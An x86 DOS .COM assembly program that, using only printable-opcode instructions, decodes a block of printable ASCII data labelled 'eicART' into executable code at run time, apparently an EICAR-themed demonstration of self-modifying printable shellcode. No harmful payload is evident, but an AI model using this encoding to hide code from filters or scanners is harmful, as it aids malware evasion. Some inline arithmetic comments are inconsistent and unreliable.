org 0x100
start:

pop	  ax		    ; AX=0x0000
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x4521	    ; AX=0x4521
sub	  ax, 0x406B	    ; AX=0x04B6 = offset of eicART in memory
push	  ax		    ; Stack: 0x0000 0x0200
pop	  bx		    ; BX=0x0200; Stack: 0x0000;

inc	  bx
inc	  bx
pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x214a	    ; AX=0x214a
push	  ax		    ; Stack: 0x0000 0x214a
pop	  cx		    ; CX=0x214a; Stack: 0x0000
sub	  byte [bx], ch     ; 0x3f-0x21=1e
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x4a4c	    ; AX=0x4a4c
push	  ax		    ; Stack: 0x0000 0x4a4c
pop	  cx		    ; CX=0x4a4c; Stack: 0x0000
sub	  byte [bx], ch
sub	  byte [bx], ch     ; [BX]=8e
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x2145	    ; AX=0x2145
push	  ax		    ; Stack: 0x0000 0x2145
pop	  cx		    ; CX=0x2145; Stack: 0x0000
sub	  byte [bx], ch     ; 0x3f-0x21=1e
inc	  bx

inc	  bx
pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x2177	    ; AX=0x2177
push	  ax		    ; Stack: 0x0000 0x2177
pop	  cx		    ; CX=0x2177; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x21=0
inc	  bx

inc	  bx
pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x2b78	    ; AX=0x2b78
push	  ax		    ; Stack: 0x0000 0x2b78
pop	  cx		    ; CX=0x2b78; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x2b=f6
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x753b	    ; AX=0x753b
push	  ax		    ; Stack: 0x0000 0x753b
pop	  cx		    ; CX=0x753b; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x75=ac
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x4f2b	    ; AX=0x4f2b
push	  ax		    ; Stack: 0x0000 0x4f2b
pop	  cx		    ; CX=0x4f2b; Stack: 0x0000
sub	  byte [bx], ch
sub	  byte [bx], ch     ; [BX]=84
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x613f	    ; AX=0x613f
push	  ax		    ; Stack: 0x0000 0x613f
pop	  cx		    ; CX=0x613f; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x61=c0
inc	  bx

inc	  bx
pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x266f	    ; AX=0x266f
push	  ax		    ; Stack: 0x0000 0x266f
pop	  cx		    ; CX=0x266f; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x26=fb
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x7539	    ; AX=0x7539
push	  ax		    ; Stack: 0x0000 0x7539
pop	  cx		    ; CX=0x7539; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x75=ac
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x4f62	    ; AX=0x4f62
push	  ax		    ; Stack: 0x0000 0x4f62
pop	  cx		    ; CX=0x4f62; Stack: 0x0000
sub	  byte [bx], ch
sub	  byte [bx], ch     ; [BX]=84
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x6148	    ; AX=0x6148
push	  ax		    ; Stack: 0x0000 0x6148
pop	  cx		    ; CX=0x6148; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x61=c0
inc	  bx

inc	  bx
pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x2b60	    ; AX=0x2b60
push	  ax		    ; Stack: 0x0000 0x2b60
pop	  cx		    ; CX=0x2b60; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x2b=f6
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x7422	    ; AX=0x7422
push	  ax		    ; Stack: 0x0000 0x7422
pop	  cx		    ; CX=0x7422; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x74=ad
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x4f7c	    ; AX=0x4f7c
push	  ax		    ; Stack: 0x0000 0x4f7c
pop	  cx		    ; CX=0x4f7c; Stack: 0x0000
sub	  byte [bx], ch
sub	  byte [bx], ch     ; [BX]=83
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x2936	    ; AX=0x2936
push	  ax		    ; Stack: 0x0000 0x2936
pop	  cx		    ; CX=0x2936; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x29=f8
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x2172	    ; AX=0x2172
push	  ax		    ; Stack: 0x0000 0x2172
pop	  cx		    ; CX=0x2172; Stack: 0x0000
sub	  byte [bx], ch     ; 0x22-0x21=1
inc	  bx

inc	  bx
inc	  bx
pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x6d25	    ; AX=0x6d25
push	  ax		    ; Stack: 0x0000 0x6d25
pop	  cx		    ; CX=0x6d25; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x6d=b4
inc	  bx

inc	  bx
inc	  bx
pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x6142	    ; AX=0x6142
push	  ax		    ; Stack: 0x0000 0x6142
pop	  cx		    ; CX=0x6142; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x61=c0
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x4c6f	    ; AX=0x4c6f
push	  ax		    ; Stack: 0x0000 0x4c6f
pop	  cx		    ; CX=0x4c6f; Stack: 0x0000
sub	  byte [bx], ch
sub	  byte [bx], ch     ; [BX]=89
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x2f58	    ; AX=0x2f58
push	  ax		    ; Stack: 0x0000 0x2f58
pop	  cx		    ; CX=0x2f58; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x2f=f2
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x5443	    ; AX=0x5443
push	  ax		    ; Stack: 0x0000 0x5443
pop	  cx		    ; CX=0x5443; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x54=cd
inc	  bx

inc	  bx
pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x4751	    ; AX=0x4751
push	  ax		    ; Stack: 0x0000 0x4751
pop	  cx		    ; CX=0x4751; Stack: 0x0000
sub	  byte [bx], ch
sub	  byte [bx], ch     ; [BX]=93
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x215c	    ; AX=0x215c
push	  ax		    ; Stack: 0x0000 0x215c
pop	  cx		    ; CX=0x215c; Stack: 0x0000
sub	  byte [bx], ch     ; 0x40-0x21=1f
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x6d2b	    ; AX=0x6d2b
push	  ax		    ; Stack: 0x0000 0x6d2b
pop	  cx		    ; CX=0x6d2b; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x6d=b4
inc	  bx

inc	  bx
pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x6865	    ; AX=0x6865
push	  ax		    ; Stack: 0x0000 0x6865
pop	  cx		    ; CX=0x6865; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x68=b9
inc	  bx

inc	  bx
pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x2140	    ; AX=0x2140
push	  ax		    ; Stack: 0x0000 0x2140
pop	  cx		    ; CX=0x2140; Stack: 0x0000
sub	  byte [bx], ch     ; 0x25-0x21=4
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x672b	    ; AX=0x672b
push	  ax		    ; Stack: 0x0000 0x672b
pop	  cx		    ; CX=0x672b; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x67=ba
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x2269	    ; AX=0x2269
push	  ax		    ; Stack: 0x0000 0x2269
pop	  cx		    ; CX=0x2269; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x22=ff
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x215e	    ; AX=0x215e
push	  ax		    ; Stack: 0x0000 0x215e
pop	  cx		    ; CX=0x215e; Stack: 0x0000
sub	  byte [bx], ch     ; 0x29-0x21=8
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x547a	    ; AX=0x547a
push	  ax		    ; Stack: 0x0000 0x547a
pop	  cx		    ; CX=0x547a; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x54=cd
inc	  bx

inc	  bx
pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x6d2d	    ; AX=0x6d2d
push	  ax		    ; Stack: 0x0000 0x6d2d
pop	  cx		    ; CX=0x6d2d; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x6d=b4
inc	  bx

inc	  bx
pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x542e	    ; AX=0x542e
push	  ax		    ; Stack: 0x0000 0x542e
pop	  cx		    ; CX=0x542e; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x54=cd
inc	  bx

inc	  bx
inc	  bx
inc	  bx
pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x6d67	    ; AX=0x6d67
push	  ax		    ; Stack: 0x0000 0x6d67
pop	  cx		    ; CX=0x6d67; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x6d=b4
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x2174	    ; AX=0x2174
push	  ax		    ; Stack: 0x0000 0x2174
pop	  cx		    ; CX=0x2174; Stack: 0x0000
sub	  byte [bx], ch     ; 0x2a-0x21=9
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x676f	    ; AX=0x676f
push	  ax		    ; Stack: 0x0000 0x676f
pop	  cx		    ; CX=0x676f; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x67=ba
inc	  bx

inc	  bx
pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x2126	    ; AX=0x2126
push	  ax		    ; Stack: 0x0000 0x2126
pop	  cx		    ; CX=0x2126; Stack: 0x0000
sub	  byte [bx], ch     ; 0x26-0x21=5
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x546a	    ; AX=0x546a
push	  ax		    ; Stack: 0x0000 0x546a
pop	  cx		    ; CX=0x546a; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x54=cd
inc	  bx

inc	  bx
pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x6d36	    ; AX=0x6d36
push	  ax		    ; Stack: 0x0000 0x6d36
pop	  cx		    ; CX=0x6d36; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x6d=b4
inc	  bx

inc	  bx
inc	  bx
pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x6139	    ; AX=0x6139
push	  ax		    ; Stack: 0x0000 0x6139
pop	  cx		    ; CX=0x6139; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x61=c0
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x6842	    ; AX=0x6842
push	  ax		    ; Stack: 0x0000 0x6842
pop	  cx		    ; CX=0x6842; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x68=b9
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x213e	    ; AX=0x213e
push	  ax		    ; Stack: 0x0000 0x213e
pop	  cx		    ; CX=0x213e; Stack: 0x0000
sub	  byte [bx], ch     ; 0x28-0x21=7
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x2135	    ; AX=0x2135
push	  ax		    ; Stack: 0x0000 0x2135
pop	  cx		    ; CX=0x2135; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x21=0
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x6762	    ; AX=0x6762
push	  ax		    ; Stack: 0x0000 0x6762
pop	  cx		    ; CX=0x6762; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x67=ba
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x2122	    ; AX=0x2122
push	  ax		    ; Stack: 0x0000 0x2122
pop	  cx		    ; CX=0x2122; Stack: 0x0000
sub	  byte [bx], ch     ; 0x3d-0x21=1c
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x215b	    ; AX=0x215b
push	  ax		    ; Stack: 0x0000 0x215b
pop	  cx		    ; CX=0x215b; Stack: 0x0000
sub	  byte [bx], ch     ; 0x26-0x21=5
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x5428	    ; AX=0x5428
push	  ax		    ; Stack: 0x0000 0x5428
pop	  cx		    ; CX=0x5428; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x54=cd
inc	  bx

inc	  bx
inc	  bx
pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x2124	    ; AX=0x2124
push	  ax		    ; Stack: 0x0000 0x2124
pop	  cx		    ; CX=0x2124; Stack: 0x0000
sub	  byte [bx], ch     ; 0x3d-0x21=1c
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x6956	    ; AX=0x6956
push	  ax		    ; Stack: 0x0000 0x6956
pop	  cx		    ; CX=0x6956; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x69=b8
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x2127	    ; AX=0x2127
push	  ax		    ; Stack: 0x0000 0x2127
pop	  cx		    ; CX=0x2127; Stack: 0x0000
sub	  byte [bx], ch     ; 0x23-0x21=2
inc	  bx

inc	  bx
pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x676a	    ; AX=0x676a
push	  ax		    ; Stack: 0x0000 0x676a
pop	  cx		    ; CX=0x676a; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x67=ba
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x4229	    ; AX=0x4229
push	  ax		    ; Stack: 0x0000 0x4229
pop	  cx		    ; CX=0x4229; Stack: 0x0000
sub	  byte [bx], ch
sub	  byte [bx], ch     ; [BX]=9e
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x214d	    ; AX=0x214d
push	  ax		    ; Stack: 0x0000 0x214d
pop	  cx		    ; CX=0x214d; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x21=0
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x544e	    ; AX=0x544e
push	  ax		    ; Stack: 0x0000 0x544e
pop	  cx		    ; CX=0x544e; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x54=cd
inc	  bx

inc	  bx
pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x4c30	    ; AX=0x4c30
push	  ax		    ; Stack: 0x0000 0x4c30
pop	  cx		    ; CX=0x4c30; Stack: 0x0000
sub	  byte [bx], ch
sub	  byte [bx], ch     ; [BX]=89
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x5e6c	    ; AX=0x5e6c
push	  ax		    ; Stack: 0x0000 0x5e6c
pop	  cx		    ; CX=0x5e6c; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x5e=c3
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x6d6c	    ; AX=0x6d6c
push	  ax		    ; Stack: 0x0000 0x6d6c
pop	  cx		    ; CX=0x6d6c; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x6d=b4
inc	  bx

inc	  bx
pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x685c	    ; AX=0x685c
push	  ax		    ; Stack: 0x0000 0x685c
pop	  cx		    ; CX=0x685c; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x68=b9
inc	  bx

inc	  bx
pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x2172	    ; AX=0x2172
push	  ax		    ; Stack: 0x0000 0x2172
pop	  cx		    ; CX=0x2172; Stack: 0x0000
sub	  byte [bx], ch     ; 0x25-0x21=4
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x673b	    ; AX=0x673b
push	  ax		    ; Stack: 0x0000 0x673b
pop	  cx		    ; CX=0x673b; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x67=ba
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x2223	    ; AX=0x2223
push	  ax		    ; Stack: 0x0000 0x2223
pop	  cx		    ; CX=0x2223; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x22=ff
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x213c	    ; AX=0x213c
push	  ax		    ; Stack: 0x0000 0x213c
pop	  cx		    ; CX=0x213c; Stack: 0x0000
sub	  byte [bx], ch     ; 0x29-0x21=8
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x5427	    ; AX=0x5427
push	  ax		    ; Stack: 0x0000 0x5427
pop	  cx		    ; CX=0x5427; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x54=cd
inc	  bx

inc	  bx
pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x6d59	    ; AX=0x6d59
push	  ax		    ; Stack: 0x0000 0x6d59
pop	  cx		    ; CX=0x6d59; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x6d=b4
inc	  bx

inc	  bx
pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x5427	    ; AX=0x5427
push	  ax		    ; Stack: 0x0000 0x5427
pop	  cx		    ; CX=0x5427; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x54=cd
inc	  bx

inc	  bx
pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x6d3b	    ; AX=0x6d3b
push	  ax		    ; Stack: 0x0000 0x6d3b
pop	  cx		    ; CX=0x6d3b; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x6d=b4
inc	  bx

inc	  bx
pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x3631	    ; AX=0x3631
push	  ax		    ; Stack: 0x0000 0x3631
pop	  cx		    ; CX=0x3631; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x36=eb
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x412d	    ; AX=0x412d
push	  ax		    ; Stack: 0x0000 0x412d
pop	  cx		    ; CX=0x412d; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x41=e0
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x5479	    ; AX=0x5479
push	  ax		    ; Stack: 0x0000 0x5479
pop	  cx		    ; CX=0x5479; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x54=cd
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x2179	    ; AX=0x2179
push	  ax		    ; Stack: 0x0000 0x2179
pop	  cx		    ; CX=0x2179; Stack: 0x0000
sub	  byte [bx], ch     ; 0x41-0x21=20
inc	  bx

inc	  bx
inc	  bx
inc	  bx
inc	  bx
inc	  bx
pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x217d	    ; AX=0x217d
push	  ax		    ; Stack: 0x0000 0x217d
pop	  cx		    ; CX=0x217d; Stack: 0x0000
sub	  byte [bx], ch     ; 0x21-0x21=0
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x2138	    ; AX=0x2138
push	  ax		    ; Stack: 0x0000 0x2138
pop	  cx		    ; CX=0x2138; Stack: 0x0000
sub	  byte [bx], ch     ; 0x2e-0x21=d
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x2125	    ; AX=0x2125
push	  ax		    ; Stack: 0x0000 0x2125
pop	  cx		    ; CX=0x2125; Stack: 0x0000
sub	  byte [bx], ch     ; 0x2b-0x21=a
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x2158	    ; AX=0x2158
push	  ax		    ; Stack: 0x0000 0x2158
pop	  cx		    ; CX=0x2158; Stack: 0x0000
sub	  byte [bx], ch     ; 0x41-0x21=20
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x2139	    ; AX=0x2139
push	  ax		    ; Stack: 0x0000 0x2139
pop	  cx		    ; CX=0x2139; Stack: 0x0000
sub	  byte [bx], ch     ; 0x41-0x21=20
inc	  bx

inc	  bx
inc	  bx
inc	  bx
inc	  bx
inc	  bx
pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x213d	    ; AX=0x213d
push	  ax		    ; Stack: 0x0000 0x213d
pop	  cx		    ; CX=0x213d; Stack: 0x0000
sub	  byte [bx], ch     ; 0x41-0x21=20
inc	  bx

inc	  bx
inc	  bx
inc	  bx
inc	  bx
pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x215d	    ; AX=0x215d
push	  ax		    ; Stack: 0x0000 0x215d
pop	  cx		    ; CX=0x215d; Stack: 0x0000
sub	  byte [bx], ch     ; 0x41-0x21=20
inc	  bx

inc	  bx
inc	  bx
inc	  bx
inc	  bx
inc	  bx
inc	  bx
pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x2172	    ; AX=0x2172
push	  ax		    ; Stack: 0x0000 0x2172
pop	  cx		    ; CX=0x2172; Stack: 0x0000
sub	  byte [bx], ch     ; 0x2e-0x21=d
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x2150	    ; AX=0x2150
push	  ax		    ; Stack: 0x0000 0x2150
pop	  cx		    ; CX=0x2150; Stack: 0x0000
sub	  byte [bx], ch     ; 0x2b-0x21=a
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x2167	    ; AX=0x2167
push	  ax		    ; Stack: 0x0000 0x2167
pop	  cx		    ; CX=0x2167; Stack: 0x0000
sub	  byte [bx], ch     ; 0x2e-0x21=d
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x216e	    ; AX=0x216e
push	  ax		    ; Stack: 0x0000 0x216e
pop	  cx		    ; CX=0x216e; Stack: 0x0000
sub	  byte [bx], ch     ; 0x2b-0x21=a
inc	  bx

inc	  bx
inc	  bx
inc	  bx
pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x213c	    ; AX=0x213c
push	  ax		    ; Stack: 0x0000 0x213c
pop	  cx		    ; CX=0x213c; Stack: 0x0000
sub	  byte [bx], ch     ; 0x41-0x21=20
inc	  bx

inc	  bx
inc	  bx
inc	  bx
inc	  bx
inc	  bx
inc	  bx
inc	  bx
pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x2135	    ; AX=0x2135
push	  ax		    ; Stack: 0x0000 0x2135
pop	  cx		    ; CX=0x2135; Stack: 0x0000
sub	  byte [bx], ch     ; 0x2e-0x21=d
inc	  bx

pop	  ax		    ; AX=0000; Stack: [EMPTY]
push	  ax		    ; Stack: 0x0000
xor	  ax, 0x213b	    ; AX=0x213b
push	  ax		    ; Stack: 0x0000 0x213b
pop	  cx		    ; CX=0x213b; Stack: 0x0000
sub	  byte [bx], ch     ; 0x2b-0x21=a
inc	  bx

inc	  bx

; 21 padding byte
times 21: inc bx

eicART:

db 102d,  96d,	63d,  34d,  63d,  44d,	33d,  49d
db  33d,  33d,	34d,  33d, 117d,  33d,	33d,  34d
db  33d, 117d,	33d,  33d,  33d,  33d,	34d, 114d
db  75d,  33d,	61d,  48d,  33d,  33d,	33d,  33d
db  33d,  33d,	64d,  33d,  63d,  33d,	73d,  37d
db  33d,  33d,	41d,  33d,  33d,  33d,	62d,  33d
db  33d, 102d,	97d,  33d,  42d,  33d,	34d,  38d
db  33d,  33d,	33d,  78d,  48d,  33d,	33d,  40d
db  33d,  33d,	61d,  38d,  33d,  33d, 114d,  61d
db  33d,  35d,	61d,  33d,  34d,  33d,	33d,  33d
db  33d,  33d,	33d,  64d,  33d,  73d,	37d,  33d
db  33d,  41d,	33d,  33d,  33d,  62d,	33d,  33d
db  33d,  79d,	33d,  33d,  33d,  65d,	42d,  46d
db  99d, 111d, 109d,  33d,  46d,  43d,	65d,  65d
db  76d,  39d,	97d, 114d, 116d,  65d, 112d, 111d
db 117d, 114d,	65d, 108d,  39d,  97d, 114d, 116d
db  33d,  46d,	43d,  46d,  43d,  46d,	46d,  46d
db  65d, 101d, 105d,  99d,  65d,  82d,	84d,  33d
db  46d,  43d,	36d
